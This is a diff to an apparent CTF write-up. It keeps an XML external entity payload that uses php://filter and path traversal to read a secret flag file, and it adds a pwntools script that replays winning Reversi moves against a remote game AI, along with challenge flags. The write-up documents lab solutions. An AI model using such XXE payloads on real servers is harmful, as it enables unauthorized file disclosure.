@@ -69,3 +69,28 @@ the solution was to download their doc file called (demo) open with archive and 
 ```<!DOCTYPE roottag [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../../fileSharing/s3cRetP4th/flagIsHeregRabiT.flag"> ]>```<br>
 <br> the directory of the flag was found using the first vuln <br>
 Flag : ASIS{Vuln_web_appZ_plus_misc0nfig_eQ_dis4st3R!}
+<br><br>
+<b>------------------------------------------------------------------------------------------------------------------------------------------------------------------</b>
+<br><br><br>
+Task name :   Chaoyang District   <br>
+Category : PPC <br>
+Description :  This is an AI programming challenge, so binary is not required to be provided. <br>
+tldr ; play one game to generate sequence of winning moves, repeat same sequences 50 times ;) <br>
+Challenge : <br>
+Challenge was Reversi game vs an AI, the problem was that the same game was repeated, and the AI did same moves, so we need to win just one game, store the moves that we used and repeat for all games <br>
+
+```from pwn import *
+
+nc = remote("178.62.22.245",32145)
+for z in range(0, 50):
+    print "[-]", z
+    seq = ['e3', 'c5', 'b5', 'g3', 'b3', 'a5', 'b7', 'a7', 'd7', 'e6', 'a4', 'a8', 'e1', 'b1', 'g8', 'c8', 'g5', 'h2',
+           'g1', 'h6', 'g7', 'h7', 'd8', 'c1', 'e8', 'a2', 'h3', 'h5']
+    for i in range(0, len(seq)):
+        m = scan_net_boards(nc)
+        print m
+        nc.writeline(seq[i])
+
+nc.interactive()```
+<br>
+Flag : ASIS{Th3_Bra1n_Wash1nG_HAHA_AI_IS_INTERESTING}
